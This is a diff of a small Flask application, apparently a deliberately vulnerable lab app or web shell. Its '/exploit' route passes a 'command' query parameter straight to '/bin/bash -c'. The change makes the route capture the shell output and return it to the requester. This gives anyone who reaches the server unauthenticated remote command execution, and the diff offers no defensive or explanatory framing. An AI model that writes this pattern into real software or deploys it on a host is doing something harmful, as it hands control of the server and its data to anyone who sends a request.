@@ -1,6 +1,6 @@
 import os
 import io
-import subprocess
+from subprocess import check_output
 from flask import Flask, request, render_template_string
 app = Flask(__name__)
 
@@ -11,11 +11,8 @@ def hello():
 @app.route("/exploit")
 def exploit():
     cmd = request.args.get('command')
-    proc = subprocess.Popen(['/bin/bash', '-c', cmd])
-
-    for line in io.TextIOWrapper(proc.stdout, encoding="utf-8"):
-      print(line)
-    return "Executed!"
+    output = check_output(['/bin/bash', '-c', cmd])
+    return render_template_string('Bash output: {{out}}', out=output)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 80))
